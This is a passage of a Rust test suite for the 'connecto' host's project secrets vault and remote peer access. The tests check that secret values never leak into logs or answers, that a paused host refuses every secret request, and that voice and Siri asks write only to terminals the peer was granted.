            }],
        },
    )
    .unwrap_err();
    assert!(matches!(&err, ClientError::Remote(_)), "{err}");

    answers.push(
        act(
            &client,
            SecretsAction::GenerateKey {
                name: "DEPLOY_KEY".into(),
                description: String::new(),
            },
        )
        .unwrap(),
    );
    assert_eq!(entry("DEPLOY_KEY").unwrap().bindings, vec![Binding::Ssh]);
    let (bytes, listed) = secrets(&client);
    let key = listed
        .entries
        .iter()
        .find(|e| e.name == "DEPLOY_KEY")
        .unwrap();
    assert!(
        key.public_key
            .as_deref()
            .is_some_and(|k| k.starts_with("ssh-ed25519 ")),
        "{key:?}"
    );
    assert!(!String::from_utf8_lossy(&bytes).contains("PRIVATE KEY"));
    answers.push(bytes);

    answers.push(act(&client, SecretsAction::Delete { name: "GH".into() }).unwrap());
    assert!(entry("GH").is_none());
    assert!(
        vault
            .view()
            .entries
            .iter()
            .any(|e| e.scope == ProviderScope::Global && e.name == "GH"),
        "the app-wide one stays"
    );
    assert!(holds(&vault, "app-wide-value-000"));

    let told: Vec<String> = vault
        .view()
        .remote_changes
        .iter()
        .map(|(_, what)| what.clone())
        .collect();
    assert_eq!(told.len(), 5, "{told:?}");
    assert!(
        told[0].contains("added the secret GH of Project"),
        "{told:?}"
    );
    assert!(told[1].contains("replaced"), "{told:?}");
    assert!(told[4].contains("removed"), "{told:?}");

    let log = rig.audit();
    for action in [
        "project-secrets",
        "project-secret-put",
        "project-secret-uses",
        "project-secret-generate",
        "project-secret-delete",
        "p/secret:GH",
    ] {
        assert!(log.contains(action), "{action}: {log}");
    }
    for value in [SECRET, SECRET_2, "app-wide-value-000"] {
        assert!(!log.contains(value), "a value in the audit: {log}");
        assert!(told.iter().all(|t| !t.contains(value)));
        for answer in &answers {
            assert!(!String::from_utf8_lossy(answer).contains(value));
        }
    }
}

/// A host terminal's request is told to a peer of its project, and not to
/// one of a project it was not sent; the peer answers it, the terminal
/// learns how to use the secret (never its value), and the request is gone
/// for everyone. A request of another project cannot be answered through
/// this one.
#[test]
fn a_terminals_request_is_told_to_a_peer_and_answered_from_there() {
    use connecto_core::{AskKind, AskRequest, Binding, ProviderScope, SecretCaller, VaultBridge};
    use connecto_net::remote_secrets::{NOT_WAITING, RemoteAnswer, SecretValue, SecretsAction};
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let vault = Arc::clone(&rig.managed.vault);
    let ask = |project: &str, name: &str| {
        let (tx, rx) = std::sync::mpsc::channel();
        let caller = SecretCaller {
            terminal: "claude-1".into(),
            project: Some(project.into()),
            project_folder: None,
            owns_pid: Arc::new(|_| false),
        };
        let id = vault
            .ask(
                &caller,
                AskRequest {
                    name: name.into(),
                    kind: AskKind::SshKey,
                    reason: "to push the release".into(),
                    proposed: vec![Binding::Ssh],
                },
                Box::new(move |text| {
                    let _ = tx.send(text);
                }),
            )
            .unwrap();
        (id, rx)
    };
    let (mine, told) = ask("p", "TOKEN");
    let (theirs, _) = ask("q", "OTHER");
    let client = rig.client(&rig.signer()).unwrap();

    let waiting = client.secret_asks().unwrap().unwrap();
    assert_eq!(waiting.len(), 1, "only the project the peer was sent");
    assert_eq!(waiting[0].id, mine);
    assert_eq!(waiting[0].name, "TOKEN");
    assert_eq!(waiting[0].reason, "to push the release");

    let err = act(
        &client,
        SecretsAction::Answer {
            ask: theirs,
            answer: RemoteAnswer::Decline,
        },
    )
    .unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why == NOT_WAITING),
        "{err}"
    );
    assert_eq!(
        connecto_core::VaultControl::view(&*vault).asks.len(),
        2,
        "the other project's request still waits"
    );

    act(
        &client,
        SecretsAction::Answer {
            ask: mine,
            answer: RemoteAnswer::Provide {
                value: SecretValue::new(SECRET.into()),
                bindings: vec![Binding::Command {
                    programs: vec!["/usr/bin/true".into()],
                    env: "TOKEN".into(),
                }],
            },
        },
    )
    .unwrap();
    let said = told.recv_timeout(Duration::from_secs(2)).unwrap();
    assert!(said.contains("set the secret TOKEN"), "{said}");
    assert!(!said.contains(SECRET));
    assert!(holds(&vault, SECRET));
    assert!(
        vault
            .visible(Some("p"))
            .iter()
            .any(|e| e.name == "TOKEN" && e.scope == ProviderScope::Project("p".into()))
    );
    assert!(client.secret_asks().unwrap().unwrap().is_empty());
    // Answered once: a second answer finds nothing waiting.
    let err = act(
        &client,
        SecretsAction::Answer {
            ask: mine,
            answer: RemoteAnswer::Decline,
        },
    )
    .unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why == NOT_WAITING),
        "{err}"
    );

    // An SSH key for a request is made on the host; the peer is sent its
    // public half.
    let (key_ask, key_told) = ask("p", "DEPLOY");
    act(
        &client,
        SecretsAction::Answer {
            ask: key_ask,
            answer: RemoteAnswer::GenerateKey,
        },
    )
    .unwrap();
    assert!(
        key_told
            .recv_timeout(Duration::from_secs(2))
            .unwrap()
            .contains("connecto secret ssh DEPLOY")
    );
    let (bytes, listed) = secrets(&client);
    assert!(
        listed
            .entries
            .iter()
            .any(|e| e.name == "DEPLOY" && e.public_key.is_some())
    );
    assert!(!String::from_utf8_lossy(&bytes).contains("PRIVATE KEY"));
    let log = rig.audit();
    assert!(log.contains("project-secret-answer"), "{log}");
    assert!(
        log.contains(&format!("p/secret:TOKEN (request {mine})")),
        "the answer is recorded by the secret it names: {log}"
    );
    assert!(log.contains("p/secret:DEPLOY"), "{log}");
    assert!(!log.contains(SECRET), "{log}");
}

/// Paused, a peer can neither read nor change a project's secrets nor
/// answer a request: nothing reaches the vault.
#[test]
fn pause_refuses_every_secret_ask_and_the_vault_is_untouched() {
    use connecto_core::VaultControl;
    use connecto_net::project_panels::ProjectAsk;
    use connecto_net::remote_secrets::{RemoteAnswer, SecretValue, SecretsAction};
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    connecto_core::VaultBridge::ask(
        &*rig.managed.vault,
        &connecto_core::SecretCaller {
            terminal: "claude-1".into(),
            project: Some("p".into()),
            project_folder: None,
            owns_pid: Arc::new(|_| false),
        },
        connecto_core::AskRequest {
            name: "WAITING".into(),
            kind: connecto_core::AskKind::Token,
            reason: "to deploy the site to Fly.io".into(),
            proposed: Vec::new(),
        },
        Box::new(|_| {}),
    )
    .unwrap();
    assert_eq!(client.secret_asks().unwrap().unwrap().len(), 1);
    rig.pause.pause();
    // Paused, a waiting request is not told: it names a secret, a terminal
    // and its reason.
    let err = client.secret_asks().unwrap_err();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::Paused)),
        "{err}"
    );
    for ask in [
        ProjectAsk::Secrets { after: None },
        ProjectAsk::SecretsAct(SecretsAction::Put {
            name: "GH".into(),
            description: String::new(),
            value: SecretValue::new(SECRET.into()),
        }),
        ProjectAsk::SecretsAct(SecretsAction::GenerateKey {
            name: "KEY".into(),
            description: String::new(),
        }),
        ProjectAsk::SecretsAct(SecretsAction::Answer {
            ask: 1,
            answer: RemoteAnswer::Decline,
        }),
    ] {
        let err = client.project_ask("p", &ask).unwrap_err();
        assert!(
            matches!(err, ClientError::Denied(DenyReason::Paused)),
            "{err}"
        );
    }
    rig.pause.resume();
    assert!(rig.managed.vault.view().entries.is_empty());
    assert!(rig.managed.vault.view().remote_changes.is_empty());
    assert!(!rig.audit().contains(SECRET));
}

/// A project with more secrets than a page holds, or than an earlier list
/// carried, is read to its last secret, which can then be changed.
#[test]
fn a_project_with_many_secrets_is_listed_to_the_last_and_the_last_is_changed() {
    use connecto_core::{Binding, ProviderScope, VaultControl};
    use connecto_net::remote_secrets::{SecretsAction, fetch_secrets};
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let vault = Arc::clone(&rig.managed.vault);
    let project = ProviderScope::Project("p".into());
    for n in 0..600 {
        vault
            .put(&project, &format!("S{n:04}"), "", "a-value-long-enough")
            .unwrap();
    }
    let client = rig.client(&rig.signer()).unwrap();
    let listed =
        fetch_secrets(|ask| client.project_ask("p", ask).map_err(|e| e.to_string())).unwrap();
    assert_eq!(listed.entries.len(), 600);
    assert_eq!(listed.entries.last().unwrap().name, "S0599");
    act(
        &client,
        SecretsAction::SetBindings {
            name: "S0599".into(),
            bindings: vec![Binding::Ssh],
        },
    )
    .unwrap_err();
    act(
        &client,
        SecretsAction::SetBindings {
            name: "S0599".into(),
            bindings: vec![Binding::Http {
                base_url: "https://api.example.com".into(),
                header: "Authorization".into(),
                prefix: "Bearer ".into(),
            }],
        },
    )
    .unwrap();
    assert!(
        vault
            .view()
            .entries
            .iter()
            .any(|e| e.name == "S0599" && e.scope == project && e.bindings.len() == 1)
    );
}

/// A peer is told the host's project groups, in the host's order, and the
/// group of each project it was sent. A project opened on the host after
/// the peer's list is not named until the peer has listed again.
#[test]
fn a_peer_is_told_the_hosts_groups_and_its_projects_in_them() {
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    let groups = client.groups().unwrap().unwrap();
    assert_eq!(
        groups
            .groups
            .iter()
            .map(|g| g.name.as_str())
            .collect::<Vec<_>>(),
        ["HARBOR", "Other"]
    );
    assert_eq!(groups.of, vec![("p".to_owned(), "group-2".to_owned())]);

    // q opens on the host, in a group, after the peer's list.
    rig.managed.empty.lock().unwrap().push(project("q"));
    let groups = client.groups().unwrap().unwrap();
    assert_eq!(
        groups.of,
        vec![("p".to_owned(), "group-2".to_owned())],
        "not named before the peer was sent it"
    );
    client.list().unwrap();
    let groups = client.groups().unwrap().unwrap();
    assert_eq!(
        groups.of,
        vec![
            ("p".to_owned(), "group-2".to_owned()),
            ("q".to_owned(), "group-1".to_owned()),
        ],
        "named once listed"
    );
}

/// A voice (Siri) request passes the guard like any project ask: recorded
/// by its action, and refused in Pause before anything reaches the project.
#[test]
fn a_siri_ask_is_audited_and_refused_in_pause() {
    use connecto_net::project_panels::ProjectAsk;
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    let ask = ProjectAsk::SiriAsk {
        request_id: "req-1".into(),
        terminal: 1,
        text: "do the tests pass?".into(),
        question: None,
        notify: None,
    };
    client.project_ask("p", &ask).unwrap();
    assert_eq!(rig.managed.asks.lock().unwrap().len(), 1);
    rig.pause.pause();
    let err = client.project_ask("p", &ask).unwrap_err();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::Paused)),
        "{err}"
    );
    assert_eq!(
        rig.managed.asks.lock().unwrap().len(),
        1,
        "a paused host took a Siri ask"
    );
    rig.pause.resume();
    let log = rig.audit();
    assert!(log.contains("siri-ask"), "{log}");
}

/// A Siri ask types as the authenticated peer, through the guard as its
/// terminal input does: Pause between the paste and the Enter refuses the
/// Enter, which never reaches the terminal.
#[test]
fn a_siri_ask_types_as_its_peer_and_pause_stops_the_enter() {
    use connecto_net::project_panels::ProjectAsk;
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    let pause = Arc::clone(&rig.pause);
    *rig.managed.between.lock().unwrap() = Some(Box::new(move || pause.pause()));
    let ask = ProjectAsk::SiriAsk {
        request_id: "req-1".into(),
        terminal: 1,
        text: "do the tests pass?".into(),
        question: None,
        notify: None,
    };
    // Paused before the answer goes back: the peer is not sent it.
    let _ = client.project_ask("p", &ask);
    rig.pause.resume();
    let typed = rig.managed.siri_typed.lock().unwrap().clone();
    assert_eq!(typed.len(), 1);
    let (owner, paste, enter) = &typed[0];
    let fingerprint = rig
        .allowed
        .public_key()
        .fingerprint(ssh_key::HashAlg::Sha256)
        .to_string();
    assert_eq!(owner, &fingerprint, "not the authenticated peer");
    assert!(paste.is_ok(), "{paste:?}");
    assert!(enter.is_err(), "the Enter went in Pause");
    let log = rig.audit();
    assert!(
        log.contains("input"),
        "the paste was not recorded as the peer's: {log}"
    );
}

/// A voice answer writes only to terminals the peer's latest list grants
/// it, checked at each write: never one it was not listed, and not the one
/// it was once the host drops it between two keys.
#[test]
fn a_voice_answer_writes_only_to_granted_terminals_checked_at_each_write() {
    use connecto_net::project_panels::ProjectAsk;
    use connecto_net::voice_answers::AnswerChoice;
    // Two terminals: when 1 goes, the project stays.
    let rig = Rig::with_list(
        vec![terminal(1, "p", None), terminal(2, "p", None)],
        FakeSession::new(1 << 20),
    );
    let client = rig.client(&rig.signer()).unwrap();
    let managed = Arc::clone(&rig.managed);
    *rig.managed.between.lock().unwrap() = Some(Box::new(move || {
        managed.inner.0.lock().unwrap().retain(|t| t.id != 1);
    }));
    let ask = ProjectAsk::QuestionAnswer {
        terminal: 1,
        question: "q-1".into(),
        occurrence: "o-1".into(),
        choice: AnswerChoice::Option(1),
    };
    let _ = client.project_ask("p", &ask);
    let typed = rig.managed.voice_typed.lock().unwrap().clone();
    assert_eq!(typed.len(), 1);
    let (granted, first, unlisted, after) = &typed[0];
    assert_eq!(*granted, (true, false));
    assert!(first.is_ok(), "{first:?}");
    assert!(unlisted.is_err(), "an unlisted terminal was written");
    assert!(after.is_err(), "a dropped terminal was written");
}

/// A list of the terminals' questions is delivered only while each terminal
/// it carries is still the peer's: one dropped after the list was made is
/// not sent its text.
#[test]
fn a_question_list_is_not_delivered_once_a_terminal_in_it_is_revoked() {
    use connecto_net::project_panels::ProjectAsk;
    let rig = Rig::with_list(
        vec![terminal(1, "p", None), terminal(2, "p", None)],
        FakeSession::new(1 << 20),
    );
    let client = rig.client(&rig.signer()).unwrap();
    // Still granted: delivered.
    let answer = client.project_ask("p", &ProjectAsk::Questions).unwrap();
    assert!(String::from_utf8_lossy(&answer).contains("secret-command"));
    // Revoked between the list and its delivery: not delivered.
    let managed = Arc::clone(&rig.managed);
    *rig.managed.between.lock().unwrap() = Some(Box::new(move || {
        managed.inner.0.lock().unwrap().retain(|t| t.id != 1);
    }));
    let err = client.project_ask("p", &ProjectAsk::Questions);
    assert!(err.is_err(), "delivered: {err:?}");
}

/// A Siri ask bounded by a deadline returns by it when the host stalls,
/// and says the ask went (it may have been acted on), never that it did not.
#[test]
fn a_bounded_siri_ask_returns_in_time_from_a_stalled_host() {
    use connecto_net::project_panels::ProjectAsk;
    use connecto_net::siri::SiriCallError;
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    *rig.managed.between.lock().unwrap() = Some(Box::new(|| thread::sleep(Duration::from_secs(3))));
    let ask = ProjectAsk::SiriResult {
        request_id: "req-1".into(),
    };
    let start = Instant::now();
    let err = client
        .project_ask_within("p", &ask, Duration::from_millis(300))
        .unwrap_err();
    let took = start.elapsed();
    assert_eq!(err, SiriCallError::Unconfirmed);
    assert!(took < Duration::from_millis(800), "took {took:?}");
    // An answer in time comes back whole.
    let answer = client
        .project_ask_within("p", &ask, Duration::from_secs(5))
        .unwrap();
    assert!(!answer.is_empty());
}
